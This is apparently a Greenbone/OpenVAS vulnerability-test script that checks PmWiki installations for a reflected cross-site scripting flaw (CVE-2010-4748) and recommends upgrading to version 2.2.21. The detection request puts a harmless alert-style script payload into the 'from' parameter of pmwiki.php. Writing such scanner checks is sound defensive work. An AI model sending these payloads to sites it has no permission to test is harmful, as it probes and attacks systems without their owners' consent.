CPE = "cpe:/a:pmwiki:pmwiki";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801700" );
	script_version( "2021-08-31T14:18:10+0000" );
	script_tag( name: "last_modification", value: "2021-08-31 14:18:10 +0000 (Tue, 31 Aug 2021)" );
	script_tag( name: "creation_date", value: "2010-12-29 07:31:27 +0100 (Wed, 29 Dec 2010)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_cve_id( "CVE-2010-4748" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "PmWiki < 2.2.21 XSS Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_pmwiki_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "pmwiki/http/detected" );
	script_tag( name: "summary", value: "PmWiki is prone to a cross-site scripting (XSS) vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site." );
	script_tag( name: "insight", value: "Input passed to the 'from' parameter to 'pmwiki.php' is not
  properly sanitised before being returned to the user." );
	script_tag( name: "affected", value: "PmWiki version 2.2.20 and prior." );
	script_tag( name: "solution", value: "Update to version 2.2.21 or later." );
	script_xref( name: "URL", value: "http://secunia.com/advisories/42608/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/96687/pm-wiki-xss.txt" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/pmwiki.php?n=Main.WikiSandbox?from=<script>alert(\"VT-XSS-Testing\")</script>";
if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\(\"VT-XSS-Testing\"\\)<", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

